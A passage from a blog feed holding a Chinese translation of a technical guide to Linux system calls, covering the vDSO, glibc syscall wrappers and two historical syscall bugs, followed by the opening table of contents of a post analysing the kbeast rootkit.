*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        syscall                 /* Do the system call.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cmpq $-4095, %rax       /* Check %rax for error.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        jae SYSCALL_ERROR_LABEL /* Jump to error handler if error.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;L(pseudo_end):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ret                     /* Return to caller.  */&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前面我们给出了x86_64 ABI文档的参考链接，其描述了用户层和内核层的调用规范。&lt;/p&gt;
&lt;p&gt;这段汇编stud很酷，因为它同时遵守两种调用规范。传递到这个函数的参数遵守用户层调用规范，但是在转移到另一组不同的寄存器利用&lt;code&gt;syscall&lt;/code&gt;进入内核之前，又遵守内核层规范。&lt;/p&gt;
&lt;p&gt;以上就是在你要执行默认没有封装器的系统调用时，glibc提供的&lt;code&gt;syscall&lt;/code&gt;封装器的工作方式。&lt;/p&gt;
&lt;h2 id=&quot;虚拟系统调用&quot;&gt;&lt;a href=&quot;#虚拟系统调用&quot; class=&quot;headerlink&quot; title=&quot;虚拟系统调用&quot;&gt;&lt;/a&gt;虚拟系统调用&lt;/h2&gt;&lt;p&gt;到目前为止，我们已经介绍了所有进入内核触发系统调用的方法，并演示了如何手动(或者半手动）触发系统调用将系统从用户层切换到内核层。&lt;/p&gt;
&lt;p&gt;倘若程序能触发一些系统调用，而不需要进入到内核呢？&lt;/p&gt;
&lt;p&gt;这就是Linux vDSO存在的原因。Linux vDSO是内核代码的一部分，但是却被映射到用户程序地址空间中在用户层执行。&lt;/p&gt;
&lt;p&gt;这也就是一些系统调用不用进入到内核就能被执行的原因。举个这样的例子: &lt;code&gt;gettimeofday&lt;/code&gt;系统调用。&lt;/p&gt;
&lt;p&gt;程序调用&lt;code&gt;gettimeofday&lt;/code&gt;并不会真正进入到内核。而是简单的调用了内核提供的一小段代码，然后在用户层执行。&lt;/p&gt;
&lt;p&gt;没有软件中断，也不需要复杂的&lt;code&gt;sysenter&lt;/code&gt;或者&lt;code&gt;syscall&lt;/code&gt;的记录工作。&lt;code&gt;gettimeofday&lt;/code&gt;只是一个普通的函数调用。&lt;/p&gt;
&lt;p&gt;当你执行&lt;code&gt;ldd&lt;/code&gt;命令时，可以看到vDSO出现在第一个条目中：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ldd `which bash`
 linux-vdso.so.1 =&amp;gt;  (0x00007fff667ff000)
 libtinfo.so.5 =&amp;gt; /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f623df7d000)
  libdl.so.2 =&amp;gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f623dd79000)
  libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f623d9ba000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f623e1ae000)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下面来看看vDSO在内核中是如何设置的。&lt;/p&gt;
&lt;h3 id=&quot;内核中的vDSO&quot;&gt;&lt;a href=&quot;#内核中的vDSO&quot; class=&quot;headerlink&quot; title=&quot;内核中的vDSO&quot;&gt;&lt;/a&gt;内核中的vDSO&lt;/h3&gt;&lt;p&gt;可以在 &lt;a href=&quot;https://github.com/torvalds/linux/tree/v3.13/arch/x86/vdso&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/&lt;/code&gt;&lt;/a&gt;中找到vDSO的源码。 其中包括一小段汇编代码、一些C源文件和一个链接器脚本&lt;/p&gt;
&lt;p&gt;此&lt;a href=&quot;https://sourceware.org/binutils/docs/ld/Scripts.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;链接器脚本&lt;/a&gt;是个很酷的东西，可以具体去了解一下。&lt;/p&gt;
&lt;p&gt;看看&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso.lds.S&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/vdso.lds.S&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * This controls what userland symbols we export from the vDSO.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;VERSION &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        LINUX_2&lt;span class=&quot;number&quot;&gt;.6&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        global:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                clock_gettime;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                __vdso_clock_gettime;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                gettimeofday;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                __vdso_gettimeofday;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                getcpu;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                __vdso_getcpu;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                time;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                __vdso_time;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        local: *;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;链接器脚本很有用处，但并不被大家所熟知。链接器脚本会处理vDSO要导出的符号表。&lt;/p&gt;
&lt;p&gt;可以看到，vDSO导出了4个不同的函数，每个函数都有两个名字。&lt;br&gt;可以在此文件夹下的C文件中找到函数的定义。&lt;/p&gt;
&lt;p&gt;例如，&lt;code&gt;gettimeofday&lt;/code&gt;的源代码可以在&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vclock_gettime.c#L281-L282&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;arch/x86/vdso/vclock_gettime.c&lt;/code&gt;&lt;/a&gt;中找到:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int gettimeofday(struct timeval *, struct timezone *)
    __attribute__((weak, alias(&amp;quot;__vdso_gettimeofday&amp;quot;)));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这段代码将&lt;code&gt;gettimeofday&lt;/code&gt;作为&lt;code&gt;__vdso_gettimeofday&lt;/code&gt; 的弱别名(&lt;a href=&quot;https://gcc.gnu.org/onlinedocs/gcc-4.3.5/gcc/Function-Attributes.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;weak alias&lt;/a&gt;)。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vclock_gettime.c#L260-L280&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;同文件&lt;/a&gt;中的&lt;code&gt;__vdso_gettimeofday&lt;/code&gt;函数中包含了当用户程序执行&lt;code&gt;gettimeofday&lt;/code&gt;系统调用时真正在用户层执行的源代码。&lt;/p&gt;
&lt;h3 id=&quot;在内存中定为vDSO&quot;&gt;&lt;a href=&quot;#在内存中定为vDSO&quot; class=&quot;headerlink&quot; title=&quot;在内存中定为vDSO&quot;&gt;&lt;/a&gt;在内存中定为vDSO&lt;/h3&gt;&lt;p&gt;由于地址空间布局随机化(&lt;a href=&quot;https://en.wikipedia.org/wiki/Address_space_layout_randomization&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ASLR&lt;/a&gt;)的原因,当程序开始执行时，vDSO会被加载到随机的地址空间中。&lt;/p&gt;
&lt;p&gt;如果vDSO加载到随机地址空间中，用户程序是如何找到它的呢？&lt;/p&gt;
&lt;p&gt;回想前文提到的&lt;code&gt;sysenter&lt;/code&gt;系统调用方法，用户程序要调用&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数，而不是自己写&lt;code&gt;sysenter&lt;/code&gt;汇编代码。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数也是vDSO的一部分。&lt;/p&gt;
&lt;p&gt;提供的代码样例中通过搜索&lt;a href=&quot;https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ELF辅助头文件&lt;/a&gt;找到和&lt;code&gt;AT_SYSINFO&lt;/code&gt;匹配的头文件，头文件中含有&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;函数的地址。&lt;/p&gt;
&lt;p&gt;类似的，要定位到vDSO, 用户程序可以搜索ELF辅助头文件找到和&lt;code&gt;AT_SYSINFO_EHDR&lt;/code&gt;匹配的头文件. 里面包含由链接器脚本生成的vDSO的ELF头的起始地址。&lt;/p&gt;
&lt;p&gt;两个例子中，程序被加载时内核都会将其地址写入到ELF头中。这也就是为何正确的地址总是出现&lt;code&gt;AT_SYSINFO_EHDR&lt;/code&gt;和&lt;code&gt;AT_SYSINFO&lt;/code&gt;中。&lt;/p&gt;
&lt;p&gt;一旦定为到ELF头部信息，用户程序就能解析ELF对象了(可以用&lt;a href=&quot;http://www.mr511.de/software/english.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;libelf&lt;/a&gt;),并且可以根据需要调用ELF对象中的函数。&lt;/p&gt;
&lt;p&gt;这样很酷，因为这就意味着vDSO能充分利用ELF有用的特性，比如&lt;a href=&quot;https://www.akkadia.org/drepper/symbol-versioning&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt; symbol versioning&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;内核文档 &lt;a href=&quot;https://github.com/torvalds/linux/tree/v3.13/Documentation/vDSO&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;Documentation/vDSO/&lt;/code&gt;&lt;/a&gt;中有解析vDSO和调用其中函数的例子。&lt;/p&gt;
&lt;h3 id=&quot;glibc中的vDSO&quot;&gt;&lt;a href=&quot;#glibc中的vDSO&quot; class=&quot;headerlink&quot; title=&quot;glibc中的vDSO&quot;&gt;&lt;/a&gt;glibc中的vDSO&lt;/h3&gt;&lt;p&gt;大多数情况下，大家都会访问vDSO，但并不会意识到。那是因为glibc利用前面章节介绍的接口对其进行了封装抽象。&lt;/p&gt;
&lt;p&gt;当一个程序被加载时，&lt;a href=&quot;http://man7.org/linux/man-pages/man8/ld.so.8.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;动态链接器和加载器&lt;/a&gt;便会加载程序依赖的DSOs，也包括vDSO.&lt;/p&gt;
&lt;p&gt;当glibc解析被加载程序的ELF头部时，会存储有关于vDSO的一些位置信息。也包括简短的stub函数，用来在真正执行系统调用前搜索vDSO中的符号名。&lt;/p&gt;
&lt;p&gt;举个例子，&lt;code&gt;glibc&lt;/code&gt;中的&lt;code&gt;gettimeofday&lt;/code&gt;函数，定义在&lt;a href=&quot;https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/sysv/linux/x86_64/gettimeofday.c#L26-L37&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;sysdeps/unix/sysv/linux/x86_64/gettimeofday.c&lt;/code&gt;&lt;/a&gt;中：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *&lt;span class=&quot;title&quot;&gt;gettimeofday_ifunc&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt; __&lt;span class=&quot;title&quot;&gt;asm__&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;string&quot;&gt;&quot;__gettimeofday&quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;gettimeofday_ifunc&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  PREPARE_VERSION (linux26, &lt;span class=&quot;string&quot;&gt;&quot;LINUX_2.6&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;61765110&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;/* If the vDSO is not available we fall back on the old vsyscall.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return (_dl_vdso_vsym (&lt;span class=&quot;string&quot;&gt;&quot;gettimeofday&quot;&lt;/span&gt;, &amp;amp;linux26)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          ?: (void *) VSYSCALL_ADDR_vgettimeofday);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;__asm (&lt;span class=&quot;string&quot;&gt;&quot;.type __gettimeofday, %gnu_indirect_function&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这段glibc中的代码会在vDSO中搜索&lt;code&gt;gettimeofday&lt;/code&gt;函数并且返回其地址。这些工作都通过 &lt;a href=&quot;http://willnewton.name/uncategorized/using-gnu-indirect-functions/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;间接函数&lt;/a&gt;封装好了。&lt;/p&gt;
&lt;p&gt;这就是程序如何通过glibc调用&lt;code&gt;gettimeofday&lt;/code&gt;并访问vDSO却完全不用切换到内核、引发特权级转变以及触发软件中断的全过程。&lt;/p&gt;
&lt;p&gt;其中也总结了Linux 32/64位 Intel/AMD系统的每种系统调用方法的优势。&lt;/p&gt;
&lt;h2 id=&quot;glibc-系统调用封装器&quot;&gt;&lt;a href=&quot;#glibc-系统调用封装器&quot; class=&quot;headerlink&quot; title=&quot;glibc 系统调用封装器&quot;&gt;&lt;/a&gt;glibc 系统调用封装器&lt;/h2&gt;&lt;p&gt;在讨论系统调用的时候，简单的提提glibc是如何处理系统调用是很有意义的。&lt;/p&gt;
&lt;p&gt;对于许多系统调用来说，glibc只需要一个简单的封装函数将参数传入合适的寄存器中，然后执行&lt;code&gt;syscall&lt;/code&gt;或者&lt;code&gt;int $0x80&lt;/code&gt;指令，或者调用&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这些都是利用一系列在文本文件中定义的表完成的，这些表会经过脚本处理并输出C代码。&lt;/p&gt;
&lt;p&gt;例如，&lt;a href=&quot;https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/syscalls.list&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;`sysdeps/unix/syscalls.list&lt;/a&gt; `文件描述了一些常用的系统调用:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;access - access i:si __access access acct - acct i:S acct chdir - chdir i:s __chdir chdir chmod - chmod i:si __chmod chmod
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要了解每一栏目的含义，可以查看处理此文件的脚本注释： &lt;a href=&quot;https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/make-syscalls.sh&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;sysdeps/unix/make-syscalls.sh&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;对于更复杂的系统调用，比如&lt;code&gt;exit&lt;/code&gt;，其会触发那些有真正C代码或汇编代码实现的处理函数，并不会出现在类似这样的文本文件中。&lt;/p&gt;
&lt;p&gt;以后的博文中会具体介绍glibc的实现以及linux内核中一些重要的系统调用。&lt;/p&gt;
&lt;h2 id=&quot;重要的syscall相关bugs&quot;&gt;&lt;a href=&quot;#重要的syscall相关bugs&quot; class=&quot;headerlink&quot; title=&quot;重要的syscall相关bugs&quot;&gt;&lt;/a&gt;重要的syscall相关bugs&lt;/h2&gt;&lt;p&gt;很荣幸能利用这次机会提两个与linux系统调用相关的神奇bugs.&lt;/p&gt;
&lt;p&gt;一起来瞧一瞧吧！&lt;/p&gt;
&lt;h3 id=&quot;CVE-2010-3301&quot;&gt;&lt;a href=&quot;#CVE-2010-3301&quot; class=&quot;headerlink&quot; title=&quot;CVE-2010-3301&quot;&gt;&lt;/a&gt;CVE-2010-3301&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-3301&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这个安全利用&lt;/a&gt;能让本地用户获取root权限。&lt;/p&gt;
&lt;p&gt;引起这个漏洞的原因就在于汇编代码中的一个小bug，其允许用户程序触发x86_64系统中的传统系统调用。&lt;/p&gt;
&lt;p&gt;此利用代码相当聪明:在一个特定的地址下，利用&lt;code&gt;mmap&lt;/code&gt;生成一块内存区域，并利用一个整数让代码产生溢出：&lt;/p&gt;
&lt;p&gt;（还记得上面章节中提到的传统中断方式中的这段代码吗？）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;call *ia32_sys_call_table(,%rax,8)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此代码可以将执行环境切换到一块任意的地址中，在那执行内核代码，从而可以将运行的进程权限提升到root.&lt;/p&gt;
&lt;h3 id=&quot;Android-sysenter-ABI-破坏&quot;&gt;&lt;a href=&quot;#Android-sysenter-ABI-破坏&quot; class=&quot;headerlink&quot; title=&quot;Android sysenter ABI 破坏&quot;&gt;&lt;/a&gt;Android &lt;code&gt;sysenter&lt;/code&gt; ABI 破坏&lt;/h3&gt;&lt;p&gt;还记得前面说过不要在应用程序代码中硬编码&lt;code&gt;sysenter&lt;/code&gt; ABI吗？&lt;/p&gt;
&lt;p&gt;不幸的是，用android-x86的一些人就容易犯这些错误。只要内核的ABI一改变，andorid-x86就瞬间无法工作。&lt;/p&gt;
&lt;p&gt;工作于内核的人最终用一些陈旧的&lt;code&gt;sysenter&lt;/code&gt;硬编码序列来恢复&lt;code&gt;sysenter&lt;/code&gt; ABI,以避免对Android设备的破坏。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://git.kernel.org/cgit/linux/kernel/git/tip/tip.git/commit/?id=30bfa7b3488bfb1bb75c9f50a5fcac1832970c60&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;是提交给Linux 内核的patch. 你也可以在提交信息中找到向android源码提交的攻击代码的链接&lt;/p&gt;
&lt;p&gt;记住：千万不要自己编写汇编代码使用&lt;code&gt;sysenter&lt;/code&gt;. 如果你因为某种原因要自己实现，可以使用前面例子中的一些代码，起码要仔细检查一下 &lt;code&gt;__kernel_vsyscall&lt;/code&gt;函数。&lt;/p&gt;
&lt;h2 id=&quot;结论&quot;&gt;&lt;a href=&quot;#结论&quot; class=&quot;headerlink&quot; title=&quot;结论&quot;&gt;&lt;/a&gt;结论&lt;/h2&gt;&lt;p&gt;Linux内核中的系统调用机制是及其复杂的。触发系统调用有许多中方案，各都有其优缺点。&lt;/p&gt;
&lt;p&gt;自己编写汇编代码来触发系统调用可不是个好主意，因为在你代码下层的ABI可能会崩溃。系统中的内核以及libc的实现会（可能会）选择最快的方式来触发系统调用。&lt;/p&gt;
&lt;p&gt;如果你不能使用glibc提供的封装器(或者那个封装器不存在),你起码应该用&lt;code&gt;syscall&lt;/code&gt;封装器函数，或者仔细检查vDSO提供的&lt;code&gt;_ _kernel_vsyscall&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;继续关注将来研究单个系统调用及其实现的相关文章。&lt;/p&gt;
&lt;h2 id=&quot;相关博文&quot;&gt;&lt;a href=&quot;#相关博文&quot; class=&quot;headerlink&quot; title=&quot;相关博文&quot;&gt;&lt;/a&gt;相关博文&lt;/h2&gt;&lt;p&gt;如果你喜欢这篇博客，你可能对以下底层技术的相关博客也感兴趣。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2016/02/29/how-does-strace-work/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How does strace work?&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2016/03/14/how-does-ltrace-work/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How does ltrace work?&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2016/03/21/apt-hash-sum-mismatch/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;APT Hash sum mismatch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2014/10/28/howto-gpg-sign-verify-deb-packages-apt-repositories/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HOWTO: GPG sign and verify deb packages and APT repositories&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.packagecloud.io/eng/2014/11/24/howto-gpg-sign-verify-rpm-packages-yum-repositories/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HOWTO: GPG sign and verify RPM packages and yum repositories&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h2&gt;&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;此文是一篇完整的译文，尽量在原文的基础上做到通俗易懂&lt;/p&gt;
&lt;p&gt;仅为学习使用，未经博主同意，请勿转载。&lt;/p&gt;
&lt;p&gt;原英文地址：&lt;a href=&quot;http://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/#bit-fast-system-calls。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/#bit-fast-system-calls。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文地址：&lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/08/linux-syscalls/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/04/08/linux-syscalls/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博:&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
&lt;p&gt;感谢好友 &lt;a href=&quot;http://weibo.com/u/2765244861?topnav=1&amp;amp;wvr=6&amp;amp;topsug=1&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@睡眼惺忪的小叶先森&lt;/a&gt;与&lt;a href=&quot;http://weibo.com/u/2495479763?topnav=1&amp;amp;wvr=6&amp;amp;topsug=1&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@skyline09&lt;/a&gt;指出的一些勘误及意见。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;长话短说（Too long;Don’t read)&lt;/li&gt;
&lt;li&gt;什么是系统调用&lt;/li&gt;
&lt;li&gt;准备知识&lt;ul&gt;
&lt;li&gt;硬件与软件&lt;/li&gt;
&lt;li&gt;用户程序，内核与CPU特权级&lt;/li&gt;
&lt;li&gt;中断&lt;/li&gt;
&lt;li&gt;特殊模块寄存器&lt;/li&gt;
&lt;li&gt;编写汇编代码触发系统调用不是个好主意
    
    </summary>
    
      <category term="operating-system" scheme="http://yoursite.com/categories/operating-system/"/>
    
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Kernel" scheme="http://yoursite.com/tags/Kernel/"/>
    
      <category term="Syscall" scheme="http://yoursite.com/tags/Syscall/"/>
    
      <category term="OS" scheme="http://yoursite.com/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>kbeast Analysis and Detection</title>
    <link href="http://yoursite.com/blog/2016/04/02/kbeast-analysis-detection/"/>
    <id>http://yoursite.com/blog/2016/04/02/kbeast-analysis-detection/</id>
    <published>2016-04-02T21:24:15.000Z</published>
    <updated>2016-05-19T13:41:44.000Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0X00 全文环境&lt;/li&gt;
&lt;li&gt;0X01 Kbeast 特性&lt;/li&gt;
&lt;li&gt;0X02 系统调用劫持基础&lt;/li&gt;
&lt;li&gt;0X03 Kbeast 使用&lt;/li&gt;
&lt;li&gt;0X04 Kbeast 核心&lt;/li&gt;
&lt;li&gt;0X05 Kbeast Detection &lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
